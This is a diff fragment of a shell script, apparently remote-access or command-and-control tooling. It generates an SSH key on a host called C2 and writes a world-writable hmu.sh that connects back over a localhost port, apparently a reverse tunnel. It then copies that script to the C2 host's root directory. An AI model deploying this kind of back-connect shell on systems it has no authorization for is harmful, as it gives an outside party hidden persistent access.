@@ -50,6 +50,8 @@ fi
 #Generating a remote ssh key
    ssh $C2 'ssh-keygen'
 
+#Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
+echo "### Creating & transferring remote connection script"
 echo "ssh-copy-id ${user}@localhost -p 43022 && ssh ${user}@localhost -p 43022" > /home/$user/hmu.sh
 sudo chmod 777 /home/$user/hmu.sh 
 scp /home/$user/hmu.sh $C2:/root
